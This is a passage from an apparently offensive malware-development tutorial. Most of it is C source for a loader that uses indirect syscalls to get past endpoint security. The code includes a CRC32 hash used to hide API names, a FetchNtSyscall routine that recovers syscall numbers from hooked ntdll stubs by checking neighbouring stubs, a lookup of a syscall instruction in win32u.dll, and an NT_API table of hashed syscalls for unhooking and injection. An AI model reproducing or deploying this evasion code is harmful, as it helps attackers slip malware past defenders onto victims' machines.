</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-13">CRCHASH Macro</h4>
<p>The <code>FetchNtSyscall</code> function uses a macro called <code>CRCHASH</code>,
 which accepts an input string and returns its hash value using the 
Cyclic Redundancy Check (CRC) calculation method, as implemented in the <code>CRC32B</code> function provided below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRC_POLYNOMIAL</span>                      <span class="token expression"><span class="token number">0xEDB88320</span></span></span>

UINT32 <span class="token function">CRC32B</span><span class="token punctuation">(</span>LPCSTR cString<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>

    UINT32      uMask   <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
                uHash   <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>
    INT         i       <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>cString<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        uHash <span class="token operator">=</span> uHash <span class="token operator">^</span> <span class="token punctuation">(</span>UINT32<span class="token punctuation">)</span>cString<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> ii<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            uMask <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token punctuation">(</span>uHash <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            uHash <span class="token operator">=</span> <span class="token punctuation">(</span>uHash <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>CRC_POLYNOMIAL <span class="token operator">&amp;</span> uMask<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        i<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token operator">~</span>uHash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">CRCHASH</span><span class="token expression"><span class="token punctuation">(</span>STR<span class="token punctuation">)</span>    <span class="token punctuation">(</span> <span class="token function">CRC32B</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span>STR <span class="token punctuation">)</span> <span class="token punctuation">)</span></span></span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-14">FetchNtSyscall Function</h4>
<p><code>FetchNtSyscall</code> returns <code>TRUE</code> if all the structure's members are populated.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">UP</span>                      <span class="token expression"><span class="token punctuation">(</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> SYSCALL_STUB_SIZE <span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DOWN</span>                    <span class="token expression">SYSCALL_STUB_SIZE</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SEARCH_RANGE</span>            <span class="token expression"><span class="token number">0xFF</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV1_SYSCALL_OPCODE</span>     <span class="token expression"><span class="token number">0x4C</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">R10_SYSCALL_OPCODE</span>      <span class="token expression"><span class="token number">0x8B</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RCX_SYSCALL_OPCODE</span>      <span class="token expression"><span class="token number">0xD1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV2_SYSCALL_OPCODE</span>     <span class="token expression"><span class="token number">0xB8</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">JMP_SYSCALL_OPCODE</span>      <span class="token expression"><span class="token number">0xE9</span></span></span>

BOOL <span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>IN DWORD dwSysHash<span class="token punctuation">,</span> OUT PNT_SYSCALL pNtSys<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token comment">// Initialize ntdll config </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_NtdllConf<span class="token punctuation">.</span>bInitialized<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InitDllsConfigStructs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_NtdllConf<span class="token punctuation">,</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pNtSys<span class="token operator">-&gt;</span>dwSyscallHash <span class="token operator">=</span> dwSysHash<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> g_NtdllConf<span class="token punctuation">.</span>dwNumberOfNames<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        PCHAR pcFuncName    <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>g_NtdllConf<span class="token punctuation">.</span>uModule <span class="token operator">+</span> g_NtdllConf<span class="token punctuation">.</span>pdwArrayOfNames<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        PVOID pFuncAddress  <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>g_NtdllConf<span class="token punctuation">.</span>uModule <span class="token operator">+</span> g_NtdllConf<span class="token punctuation">.</span>pdwArrayOfAddresses<span class="token punctuation">[</span>g_NtdllConf<span class="token punctuation">.</span>pwArrayOfOrdinals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// If syscall hash value found</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CRCHASH</span><span class="token punctuation">(</span>pcFuncName<span class="token punctuation">)</span> <span class="token operator">==</span> dwSysHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token comment">// The syscall is not hooked</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress<span class="token punctuation">)</span> <span class="token operator">==</span> MOV1_SYSCALL_OPCODE
                <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> R10_SYSCALL_OPCODE
                <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> RCX_SYSCALL_OPCODE
                <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> MOV2_SYSCALL_OPCODE
                <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span>
                <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                BYTE    high   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                BYTE    low    <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                pNtSys<span class="token operator">-&gt;</span>dwSSn <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low<span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// break for-loop [i]</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// If hooked - scenario 1</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress<span class="token punctuation">)</span> <span class="token operator">==</span> JMP_SYSCALL_OPCODE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token keyword">for</span> <span class="token punctuation">(</span>WORD idx <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;=</span> SEARCH_RANGE<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// check neighboring syscall down</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> MOV1_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> R10_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> RCX_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> MOV2_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        BYTE    high   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        BYTE    low    <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        pNtSys<span class="token operator">-&gt;</span>dwSSn <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low <span class="token operator">-</span> idx<span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// break for-loop [idx]</span>
                    <span class="token punctuation">}</span>
                    <span class="token comment">// check neighboring syscall up</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> MOV1_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> R10_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> RCX_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> MOV2_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        BYTE    high   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        BYTE    low    <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        pNtSys<span class="token operator">-&gt;</span>dwSSn <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low <span class="token operator">+</span> idx<span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// break for-loop [idx]</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// if hooked - scenario 2</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> JMP_SYSCALL_OPCODE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token keyword">for</span> <span class="token punctuation">(</span>WORD idx <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;=</span> SEARCH_RANGE<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// check neighboring syscall down</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> MOV1_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> R10_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> RCX_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> MOV2_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        BYTE    high   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        BYTE    low    <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> idx <span class="token operator">*</span> DOWN<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        pNtSys<span class="token operator">-&gt;</span>dwSSn <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low <span class="token operator">-</span> idx<span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// break for-loop [idx]</span>
                    <span class="token punctuation">}</span>
                    <span class="token comment">// check neighboring syscall up</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> MOV1_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> R10_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> RCX_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> MOV2_SYSCALL_OPCODE
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        BYTE    high   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        BYTE    low    <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> idx <span class="token operator">*</span> UP<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        pNtSys<span class="token operator">-&gt;</span>dwSSn <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low <span class="token operator">+</span> idx<span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// break for-loop [idx]</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// break for-loop [i]</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>pNtSys<span class="token operator">-&gt;</span>dwSSn <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token comment">// Search for a 'syscall' instruction in win32u.dll</span>
    <span class="token keyword">return</span> <span class="token function">FetchWin32uSyscallInst</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pNtSys<span class="token operator">-&gt;</span>pSyscallInstAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-15">NT_API Structure</h3>
<p>Since the HellsHall implementation has been finalized, the <code>NT_API</code> structure will be introduced, which will contain all the <code>NT_SYSCALL</code> structures related to the syscalls that will be invoked by the loader.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_NT_API</span> <span class="token punctuation">{</span>

    NT_SYSCALL	NtOpenSection<span class="token punctuation">;</span>                     <span class="token comment">// Unhooking routine</span>
    NT_SYSCALL	NtMapViewOfSection<span class="token punctuation">;</span>                <span class="token comment">// Unhooking routine</span>
    NT_SYSCALL	NtProtectVirtualMemory<span class="token punctuation">;</span>            <span class="token comment">// Injection routine</span>
    NT_SYSCALL	NtUnmapViewOfSection<span class="token punctuation">;</span>              <span class="token comment">// Unhooking routine</span>
    NT_SYSCALL  NtAllocateVirtualMemory<span class="token punctuation">;</span>           <span class="token comment">// Injection routine</span>
    NT_SYSCALL  NtDelayExecution<span class="token punctuation">;</span>                  <span class="token comment">// Delay execution  </span>

    BOOL        bInit<span class="token punctuation">;</span>                             <span class="token comment">// Set to TRUE if initialized.</span>

<span class="token punctuation">}</span> NT_API<span class="token punctuation">,</span> <span class="token operator">*</span> PNT_API<span class="token punctuation">;</span>


NT_API		g_Nt			<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>             <span class="token comment">// Global variable to be used across the loader.</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-16">InitIndirectSyscalls Function</h3>
<p>The function <code>InitIndirectSyscalls</code> will be called to populate an <code>NT_API</code> structure. The <code>InitIndirectSyscalls</code> function will call <code>FetchNtSyscall</code> for every <code>NT_SYSCALL</code> structure in <code>NT_API</code>. <code>InitIndirectSyscalls</code> returns a value of <code>TRUE</code> if all the elements within the input NT_API have been populated. The function takes one parameter, <code>Nt</code>, a pointer to an <code>NT_API</code> structure to be populated.</p>
<p>It's important to mention that the syscall hashes, which are necessary for calling <code>FetchNtSyscall</code>,
 are generated using the CRC string hashing algorithm that was 
introduced earlier. The hash generator program will be made available 
alongside the module's source code.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// HASHES</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NtOpenSection_CRC32</span>                 <span class="token expression"><span class="token number">0x709DE3CC</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NtMapViewOfSection_CRC32</span>            <span class="token expression"><span class="token number">0xA4163EBC</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NtProtectVirtualMemory_CRC32</span>        <span class="token expression"><span class="token number">0x5C2D1A97</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NtUnmapViewOfSection_CRC32</span>          <span class="token expression"><span class="token number">0x90483FF6</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NtAllocateVirtualMemory_CRC32</span>       <span class="token expression"><span class="token number">0xE0762FEB</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NtDelayExecution_CRC32</span>              <span class="token expression"><span class="token number">0xF5A86278</span></span></span>


